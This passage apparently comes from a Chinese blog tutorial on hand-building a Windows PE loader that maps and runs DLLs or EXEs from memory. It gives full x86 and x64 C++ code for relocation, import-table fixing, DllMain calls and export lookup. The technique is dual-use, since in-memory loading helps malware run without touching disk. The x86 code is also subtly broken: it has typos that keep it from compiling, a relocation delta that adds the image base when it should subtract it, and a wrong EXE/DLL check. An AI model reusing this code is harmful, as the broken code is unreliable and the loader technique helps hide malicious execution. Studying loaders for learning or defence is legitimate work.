GetFileSize(hFile, NULL);printf(&quot;GetFileSize: %d\\n&quot;, dwFileSize);// 申请动态内存PBYTE lpData = new BYTE[dwFileSize];if (NULL == lpData)&#123; printf(&quot;申请内存出错\\n&quot;); return 1;&#125;// 将文件读取到内存中DWORD dwRead = 0;if (FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;dwRead, NULL))&#123; printf(&quot;ReadFile Failed\\n&quot;); return 1;&#125;printf(&quot;lpData: %08x\\n&quot;, *(short*)lpData); // 5A4D CreateFile 创建或打开文件或I&#x2F;O设备, 此函数区分多字节和Unicode两种模式 12345678910111213// UNICODEHANDLEWINAPICreateFileW( _In_ LPCWSTR lpFileName, // 要创建或打开的文件或设备名称 _In_ DWORD dwDesiredAccess, // 请求对文件或设备的访问权限, 常用值GENERIC_READ、GENERIC_WRITE _In_ DWORD dwShareMode, // 请求的文件或设备的共享模式（可以是读取、写入、删除） _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, // 指向LPSECURITY_ATTRIBUTES结构的指针, 此参数可以为NULL _In_ DWORD dwCreationDisposition, // 要对存在或不存在的文件或设备执行的操作, 此参数通常设置为OPEN_EXISTING _In_ DWORD dwFlagsAndAttributes, // 文件或设备属性和标志 _In_opt_ HANDLE hTemplateFile // 具有GENERIC_READ访问权限的模板文件的有效句柄, 此参数可以为NULL ); 如果函数成功, 则返回值是指定文件、设备、命名管道或邮件槽的打开句柄;如果函数失败, 则返回值为INVALID_HANDLE_VALUE; GetFileSize 检索指定文件的大小（以字节为单位） 123456DWORDWINAPIGetFileSize( _In_ HANDLE hFile, // 文件句柄 _Out_opt_ LPDWORD lpFileSizeHigh // 指向变量的指针, 其中返回了文件大小的高位双字。如果应用程序不需要高位双字, 此参数可以为NULL ); 如果函数成功, 则返回值为文件大小的低位双字, 如果lpFileSizeHigh为非NULL, 则该函数会将文件大小的高位双字放入该参数指向的变量中;如果函数失败且lpFileSizeHigh为NULL, 则返回值INVALID_FILE_SIZE; ReadFile 从指定的文件或输入&#x2F;输出 (I&#x2F;O) 设备读取数据 123456789BOOLWINAPIReadFile( _In_ HANDLE hFile, // 文件/设备句柄 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer, // 指向接收从文件或设备读取的数据的缓冲区的指针 _In_ DWORD nNumberOfBytesToRead, // 要读取的最多字节数 _Out_opt_ LPDWORD lpNumberOfBytesRead, // 指向变量的指针 _Inout_opt_ LPOVERLAPPED lpOverlapped // 此参数可为NULL ); 如果函数成功，则返回值为非零 (TRUE);如果函数失败或正在异步完成，则返回值为零 (FALSE); 2. FileBuffer &#x3D;&gt; ImageBuffer将FileBuffer转换成ImageBuffer可以分为两步: 先将PE头部复制至内存中;然后循环将节内容复制过去; 代码示例 123456789101112131415161718192021222324252627BOOL MmMapFile(LPVOID lpData, LPVOID lpBaseAddress)&#123; // 解析PE文件格式 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData); // 获取PE header大小 DWORD dwSizeOfHeaders = pNt-&gt;OptionalHeader.SizeOfHeaders; // 获取节数量 DWORD dwNumOfSections = pNt-&gt;FileHeader.NumberOfSections; // 将头部数据复制过去 RtlCopyMemory(lpBaseAddress, lpData, dwSizeOfHeaders); // 解析第一个节 PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); // 循环节 for(size_t i = 0; i &lt; dwNumOfSections; i++) &#123; if((0 == pSec[i].VirtualAddress) || (0 == pSec[i].PointerToRawData)) &#123; continue; &#125; LPVOID lpSrcMem = (LPVOID)(pSec[i].PointerToRawData + (DWORD)lpData); LPVOID lpDesMem = (LPVOID)(pSec[i].VirtualAddress + (DWORD)lpBaseAddress); DWROD dwSizeOfRawData = pSec[i].SizeOfRawData; RtlCopyMemory(lpDesMem, lpSrcMem, dwSizeOfRawData); &#125; return TRUE;&#125; 3. 修正重定位表重定位表Relocation(重定位)是一种将程序中的一些地址修正为运行时可用的实际地址的机制。在程序编译过程中, 由于程序中使用了各种全局变量和函数, 这些变量和函数的地址还没有确定, 因此它们的地址只能暂时使用一个相对地址。当程序被加载到内存中运行时, 这些相对地址需要被修正为实际的绝对地址, 这个过程就是重定位;在Windows操作系统中, 程序被加载到内存中运行时, 需要将程序中的各种内存地址进行重定位, 以使程序能正确运行。Windows系统使用PE(Portable Executable)文件格式来存储可执行程序, 其中包括重定位信息。当程序被加载到内存中时, 系统会解析这些重定位信息, 并将程序中的各种内存地址进行重定位。重定位表一般出现在Dll中, 因为Dll都是动态加载, 所以地址不固定, Dll的入口点在整个执行过程中至少要执行2次, 一次时在开始时执行初始化工作, 一次则是在结束时做最后的收尾工作, 重定位表则是解决Dll的地址问题; 重定位表的结构 重定位结构 代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344BOOL DoRelocationTable(LPVOID lpBaseAddress)&#123; // 解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBaseAddress); // 定位重定位位置 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取重定位表 PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)(pDataDir-&gt;VirtualAddress + (DWORD)lpBaseAddress); // 判断是否有重定位表, 数据目录表不存在时, VirtualAddress为0, 也就是指向映像基址 if ((LPVOID)pLoc == lpBaseAddress) &#123; return FALSE; &#125; // 循环重定位表, 重定位表VirtualAddress和SizeOfBlock都为0表示重定位表结束 while((pLoc.VirtualAddress + pLoc-&gt;SizeOfBlock) != 0) &#123; // 重定位数据, 位于IMAGE_BASE_RELOCATION表开头8字节之后 PWORD pLocData = (PWORD)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION)); // 计算本节需要修正的重定位项（地址）的数目, 每个数据都是16字节（4+12字节, 高4位表示重定位类型, 低12位为RVA） // SizeOfBlock的值包括了SizeOfBlock和VirtualAddress的大小, 8字节需要减去 DWORD dwNumOfpLoc = (pLoc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (size_t i = 0; i &lt; dwNumOfpLoc; i++) &#123; // 高位为3表示有效重定位 if ((DWORD)(pLocData[i] &amp; 0x0000F000) == 0x00003000) &#123; // 需要修正的数据 // 修正重定位数据, 重定位表记录的是存在硬编码的地址, 以基址+偏移的形式 // 存在硬编码的地址 = 重定位基址 + 重定位表数据偏移 // = 基址 + 重定位地址 + 重定位数据（数据后12位） PDWORD pAddress = (PDWORD)((PBYTE)pDos + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; 0x0FFF)); // 重定位地址 = 硬编码地址 - ImageBase + 实际基地址 // = 实际基地址 - ImageBase + 硬编码地址 // *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + (DWORD)pDos; DWORD dwDelta = (DWORD)pDos + pNt-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; // 循环下一个重定位区段 pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock); &#125; return TRUE;&#125; 4. 修正导入表PE加载器在加载PE的时候会将导入函数的地址填入导入地址表中, 导入表结构如下: 123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) 导入名称表RVA &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) 导入地址表RVA&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 主要用到的是OriginalFirstThunk和FirstThunk; 这两个表用到的结构体是一样的(IMAGE_THUNK_DATA): 123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; 如果指向导入名称表; 则内容是AddressOfData, 指向IMAGE_IMPORT_BY_NAME结构体;如果指向导入地址表: 序号导入的话, Ordinal首位是1, 低4位是导入序号; 名称导入的话, Function的值是函数地址; 这里我们需要将导入函数的地址填入导入地址表中, 所以需要知道这个函数是怎么导入的, 然后通过GetProcAddress API获取函数地址, 然后将函数地址填入导入地址表中; 通过GetProcAddress获取函数地址, 需要知道Dll名称, 通过Dll名称获取模块句柄 所以代码流程是: 修正导入表流程先获取导入表数组的数量和第一个成员的地址;根据导入表的数量, 进行循环遍历;获取导入名称表;获取导入地址表;进行导入名称表的遍历(导入名称表数组以0作为最后一个成员结束);获取导入函数的名称或序号；加载这个Dll, 通过名称或序号, 获取其函数地址;将地址填入导入地址表;进入下一次循环;进入下一次循环;两次遍历完成后, 导入表就已经完成了修正; 代码示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566BOOL DoImportTable(LPVOID lpBaseAddress)&#123; // 解析PE结构 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pDir-&gt;VirtualAddress + (DWORD)pDos); // 循环遍历Dll导入表中的Dll以及获取导入表中的函数地址 char* szDllName = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA pImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME pImportByName = NULL; PIMAGE_THUNK_DATA pImportFuncAddrArray = NULL; FARPROC pfFuncAddress = NULL; DWORD i = 0; while(TRUE) &#123; if(0 == pImport-&gt;OriginalFirstThunk) &#123; break; &#125; // 获取导入表中Dll的名称并加载Dll szDllName = (char*)(pImport-&gt;Name + (DWORD)pDos); hDll = GetModuleHandleA(szDllName); if(hDll == NULL) &#123; hDll = LoadLibraryA(szDllName); if(hDll == NULL) &#123; pImport++; continue; &#125; &#125; i = 0; // 获取OriginalFirstThunk以及对应的导入函数名称表首地址 pImportNameArray = (PIMAGE_THUNK_DATA)(pImport-&gt;OriginalFirstThunk + (DWORD)pDos); // 获取FirstThunk以及对应的导入函数地址表首地址 pImportFuncAddrArray = (PIMAGE_THUNK_DATA)(pImport-&gt;FirstThunk + (DWORD)pDos); while(TRUE) &#123; if(0 == pImportNameArray[i].u1.AddressOfData) &#123; break; &#125; // 获取IMAGE_IMPORT_BY_NAME结构 pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImportNameArray[i].u1.AddressOfData); // 判断导出函数是序号导出还是函数名称导出 if(0x80000000 &amp; pImportNameArrar[i].u1.Ordinal) &#123; // 序号导出 // 当IMPORT_THUNK_DATA值的最高位为1时, 表示函数以序号方式导出, 此时低位被看作是一个函数序号 pfFuncAddress = GetProcAddress(hDll, (LPCSTR)(pImportNameArray[i].u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; // 名称导出 pfFuncAddress = GetProcAddress(hDll, (LPCSTR)pImportByName-&gt;Name); &#125; // 注意此处的函数地址表的赋值, 要对照PE格式进行装载 pImportFuncAddrArray[i].u1.Function = (DWORD)pfFuncAddress; i++; &#125; pImport++; &#125; return TRUE;&#125; 5. 修改Dll的加载基址ImageBasePE加载器在加载PE的时候会将进程分配的基地址填入扩展头的ImageBase中; 12345678BOOL SetImageBase(LPVOID lpBaseAddress)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); pNt-&gt;OptionalHeader.ImageBase = (DWORD)lpBaseAddress; return TRUE;&#125; 6. 修改DllMain入口点调用Dll的入口函数DllMain, 函数地址则是PE文件的入口点; 1234567891011BOOL CallDllMain(LPVOID lpBaseAddress)&#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); DllMain = (typedef_DllMain)(pNt-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD)pDos); // 调用入口函数, 附加进程DLL_PROCESS_ATTACH BOOL bRet = DllMain((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, NULL); return bRet;&#125; 7. 获取Dll导出函数导出表PE文件运行, 需要依赖Dll; 系统Dll包括Kernel32.dll、User32.dll等;导出表时当前PE文件提供了哪些函数给别人使用;不管是exe还是Dll, 本质都是PE文件; exe文件也可以导出函数给别人使用; 一般exe没有, 但不是不可以; 导出表结构 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; // DWORD TimeDateStamp; // 时间戳, 编译时间; 把秒转为时间, 可以知道这个Dll是什么时候编译出来的 WORD MajorVersion; WORD MinorVersion; DWORD Name; // 指向该导出表文件名的字符串, 也就是这个Dll的名称(RVA) DWORD Base; // 导出函数的起始序号 DWORD NumberOfFunctions; // 所有导出函数的个数 DWORD NumberOfNames; // 以名称导出的函数个数 DWORD AddressOfFunctions; // RVA from base of image（导出的函数地址表） DWORD AddressOfNames; // RVA from base of image（导出的函数名称表） DWORD AddressOfNameOrdinals; // RVA from base of image（导出的函数序号表）&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 遍历流程获取导出函数名称;比较是否是要找函数名称;如果是, 则获取函数序号(2字节);根据函数序号获取函数地址; 123456789101112131415161718192021222324252627LPVOID MmGetProcAddress(LPVOID lpBaseAddress, wchar_t* lpszFuncName)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD)pDos); PDWORD dwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)pDos); PDWORD dwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)pDos); PWORD pwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)pDos); DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; for(size_t i = 0; i &lt; dwNumberOfNames; i++) &#123; if(!dwAddressOfFunctions[i]) &#123; continue; &#125; PWCHAR szFuncName = (PWCHAR)(dwAddressOfNames[i] + (DWORD)pDos); if(lstrcmpi(lpszFuncName, szFuncName) == 0) &#123; return (LPVOID)(dwAddressOfFunctions[pwAddressOfNameOrdinals[i]] + (DWORD)pDos); &#125; &#125; return LPVOID();&#125; 8. 释放内存加载的Dll释放资源 1234567891011BOOL MmFreeLibrary(LPVOID lpBaseAddress)&#123; BOOL bRet = NULL; if (NULL == lpBaseAddress) &#123; return bRet; &#125; bRet = VirtualFree(lpBaseAddress, 0, MEM_RELEASE); lpBaseAddress = NULL; return bRet;&#125; 内存加载Dll执行演示示例Dll源代码12345678910111213141516171819202122// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;extern &quot;C&quot; __declspec(dllexport)void ShowMessage() &#123; MessageBox(NULL, L&quot;I&#x27;m DLL File&quot;, L&quot;HELLO&quot;, MB_OK);&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; PELoader_Demo.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// PELoader_Demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;MmLoadDll.h&quot;int main()&#123; wchar_t szFileName[MAX_PATH] = L&quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\哔哩哔哩学习\\\\PE Learn\\\\PELoader_Demo\\\\Debug\\\\TestDLL_01.dll&quot;; HANDLE hFile = CreateFile( szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL ); if (INVALID_HANDLE_VALUE == hFile) &#123; printf(&quot;CreateFile Failed: %d\\n&quot;, GetLastError()); return 0; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); printf(&quot;FileSize: %d\\n&quot;, dwFileSize); // 申请动态内存并读取DLL到内存中 PBYTE lpData = new BYTE[dwFileSize]; if (lpData == NULL) &#123; printf(&quot;申请内存出错: %d\\n&quot;, GetLastError()); return 0; &#125; DWORD dwRet = 0; BOOL bRet = ReadFile(hFile, lpData, dwFileSize, &amp;dwRet, NULL); if (!bRet) &#123; printf(&quot;ReadFile Failed: %d\\n&quot;, GetLastError()); return 0; &#125; printf(&quot;lpData: %08x\\n&quot;, *(short*)lpData); // 将内存DLL加载到程序中 LPVOID lpBaseAddress = MmLoadLibrary(lpData, dwFileSize); if (lpBaseAddress == NULL) &#123; printf(&quot;MmLoadLibrary Failed: %d\\n&quot;, GetLastError()); return 0; &#125; printf(&quot;DLL加载成功\\n&quot;); // 获取DLL导出函数并调用 typedef void (*typedef_ShowMessage)(); const char* szName = &quot;ShowMessage&quot;; typedef_ShowMessage ShowMessage = (typedef_ShowMessage)MmGetProcAddress(lpBaseAddress, (wchar_t*)szName); if (NULL == ShowMessage) &#123; printf(&quot;MmGetProcAddress Failed\\n&quot;); return 0; &#125; ShowMessage(); // 释放从内存加载的DLL BOOL bRet1 = MmFreeLibrary(lpBaseAddress); if (FALSE == bRet1) &#123; printf(&quot;MmFreeLibrary Failed\\n&quot;); return 0; &#125; // 释放 delete[] lpData; lpData = NULL; CloseHandle(hFile); //system(&quot;pause&quot;); return 0;&#125; 调用导出函数调用导出函数 内存加载exe执行待补充… x64位手工模拟PE加载器x64位手工模拟PE加载器实现原理和x32位相同, 需注意的是在修复重定位时判断是否进行修复时: x64位修复项等于0x10; x86位(IMAGE_REL_BASED_HIGHLOW)等于0x3; 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223// LoadPE_Demo_x64.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;winternl.h&gt;typedef BOOL(WINAPI* typedef_DllMain)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);// 获取SizeOfImageDWORD GetSizeOfImage(LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBuffer); return pNt-&gt;OptionalHeader.SizeOfImage;&#125;// 将fileBuffer转成ImageBufferBOOL MemMapFile(LPVOID lpBuffer, LPVOID lpBaseAddress)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBuffer); PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); DWORD dwSizeOfHeaders = pNt-&gt;OptionalHeader.SizeOfHeaders; DWORD dwSizeOfSections = pNt-&gt;FileHeader.NumberOfSections; RtlCopyMemory(lpBaseAddress, lpBuffer, dwSizeOfHeaders); for (size_t i = 0; i &lt; dwSizeOfSections; i++) &#123; if ((pSec[i].VirtualAddress == 0) || (pSec[i].SizeOfRawData == 0)) &#123; continue; &#125; LPVOID lpSrcMem = (LPVOID)(pSec[i].PointerToRawData + (DWORD64)lpBuffer); LPVOID lpDesMem = (LPVOID)(pSec[i].VirtualAddress + (DWORD64)lpBaseAddress); RtlCopyMemory(lpDesMem, lpSrcMem, pSec[i].SizeOfRawData); &#125; return TRUE;&#125;// 修复重定位表BOOL FixRelocation(LPVOID lpBaseAddress)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBaseAddress); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC); PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(pDir-&gt;VirtualAddress + (DWORD64)lpBaseAddress); if ((LPVOID)pBaseReloc == lpBaseAddress) &#123; printf(&quot;不存在重定位表\\n&quot;); return TRUE; &#125; while (pBaseReloc-&gt;VirtualAddress != 0 &amp;&amp; pBaseReloc-&gt;SizeOfBlock != 0) &#123; PWORD pLocData = (PWORD)((DWORD64)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION)); DWORD dwNumOfReloc = (pBaseReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; for (size_t i = 0; i &lt; dwNumOfReloc; i++) &#123; // x64位修复项等于0x10 x86 IMAGE_REL_BASED_HIGHLOW if((pLocData[i] &gt;&gt; 12) == IMAGE_REL_BASED_DIR64) &#123; unsigned long long int* pAddress = (unsigned long long int*)((PBYTE)pDos + pBaseReloc-&gt;VirtualAddress + (pLocData[i] &amp; 0x0FFF)); printf(&quot;Fix Relocation: %08x\\t %p\\n&quot;, (pLocData[i] &gt;&gt; 12), pAddress); ULONGLONG dwDelta = (ULONGLONG)pDos - pNt-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; pBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pBaseReloc + pBaseReloc-&gt;SizeOfBlock); &#125; return TRUE;&#125;// 修正导入表BOOL FixImportTable(LPVOID lpBaseAddress)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBaseAddress); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pDir-&gt;VirtualAddress + (DWORD64)lpBaseAddress); int wcharSize = 0; WCHAR wcDllName[256]&#123;&#125;; HMODULE hDll = NULL; DWORD dwIndex = 0; PIMAGE_THUNK_DATA pINT = NULL; PIMAGE_IMPORT_BY_NAME pName = NULL; PIMAGE_THUNK_DATA pIAT = NULL; FARPROC lpFuncAddress = NULL; while (pImport-&gt;Name) &#123; char* szDllName = (char*)(pImport-&gt;Name + (DWORD64)lpBaseAddress); wcharSize = MultiByteToWideChar(CP_ACP, 0, szDllName, -1, NULL, 0); wsprintf(wcDllName, L&quot;%S&quot;, szDllName); printf(&quot;[+] Fix DllName: %S\\n&quot;, wcDllName); hDll = GetModuleHandle(wcDllName); if (hDll == NULL) &#123; hDll = LoadLibrary(wcDllName); if (hDll == NULL) &#123; pImport++; continue; &#125; &#125; PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)lpBaseAddress + pImport-&gt;FirstThunk); while (pThunk-&gt;u1.AddressOfData) &#123; if (pThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG64) &#123; printf(&quot;\\t[+] Fix By Ordinal: %I64d\\n&quot;, pThunk-&gt;u1.Ordinal &amp; 0x0000FFFF); lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(pThunk-&gt;u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; pName = (PIMAGE_IMPORT_BY_NAME)(pThunk-&gt;u1.AddressOfData + (BYTE*)lpBaseAddress); printf(&quot;\\t[+] Fix By Name: %s\\n&quot;, pName-&gt;Name); lpFuncAddress = GetProcAddress(hDll, pName-&gt;Name); &#125; pThunk-&gt;u1.Function = (ULONGLONG)lpFuncAddress; pThunk++; &#125; pImport++; &#125; return TRUE;&#125;// 判断是EXE还是DLLBOOL IsExeOrDll(LPVOID lpBaseAddress)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBaseAddress); if ((pNt-&gt;FileHeader.Characteristics &amp; 0x00002000) == 1) &#123; return FALSE; &#125; return TRUE;&#125;BOOL CallDllMain(LPVOID lpBaseAddress)&#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)pDosHeader + pDosHeader-&gt;e_lfanew); if (IsExeOrDll(lpBaseAddress)) &#123; // 表示EXE执行 //DWORD64 lpExeEntry = (DWORD64)(pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD64)lpBaseAddress); HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)((BYTE*)lpBaseAddress + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE); return TRUE; &#125; DllMain = (typedef_DllMain)((DWORD64)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); // 调用入口函数,附加进程DLL_PROCESS_ATTACH BOOL bRet = DllMain((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, NULL); if (FALSE == bRet) &#123; printf(&quot;DllMain\\n&quot;); &#125; return bRet;&#125;int main()&#123; wchar_t wcFilePath[MAX_PATH] = L&quot;D:\\\\xxx.exe&quot;; // 打开文件句柄 HANDLE hFile = CreateFile(wcFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hFile) &#123; printf(&quot;CreateFile Failed\\n&quot;); return 0; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); printf(&quot;GetFileSize: %d\\n&quot;, dwFileSize); LPVOID lpBuffer = new BYTE[dwFileSize]; DWORD lpNumberOfBytesRead = 0; if (FALSE == ReadFile(hFile, lpBuffer, dwFileSize, &amp;lpNumberOfBytesRead, NULL)) &#123; printf(&quot;ReadFile Failed\\n&quot;); return 0; &#125; printf(&quot;lpBuffer: %x\\n&quot;, *((PBYTE)lpBuffer + 1)); // 获取ImageSize DWORD dwSizeOfImage = GetSizeOfImage(lpBuffer); printf(&quot;GetSizeOfImage: %d\\n&quot;, dwSizeOfImage); LPVOID lpBaseAddress = VirtualAlloc(NULL, dwSizeOfImage, MEM_COMMIT, PAGE_READWRITE); if (lpBaseAddress == NULL) &#123; printf(&quot;VirtualAlloc Failed\\n&quot;); return 0; &#125; // FileBuffer ==&gt; ImageBuffer if (FALSE == MemMapFile(lpBuffer, lpBaseAddress)) &#123; printf(&quot;MemMapFile Failed\\n&quot;); return 0; &#125; printf(&quot;lpBaseAddress: %08x\\n&quot;, *((PBYTE)lpBaseAddress + 1)); // 修正重定位表 if (FALSE == FixRelocation(lpBaseAddress)) &#123; printf(&quot;FixRelocation Failed\\n&quot;); return 0; &#125; // 修正导入表 if (FALSE == FixImportTable(lpBaseAddress)) &#123; printf(&quot;FixImportTable Failed\\n&quot;); return 0; &#125; // 修改内存属性 DWORD lpflOldProtect = 0; if (FALSE == VirtualProtect(lpBaseAddress, dwSizeOfImage, PAGE_EXECUTE_READWRITE, &amp;lpflOldProtect)) &#123; printf(&quot;VirtualProtectEx Failed\\n&quot;); return 0; &#125; // 修改入口点 if (FALSE == CallDllMain(lpBaseAddress)) &#123; printf(&quot;CallDllMain Failed\\n&quot;); return 0; &#125;&#125; 仓库地址 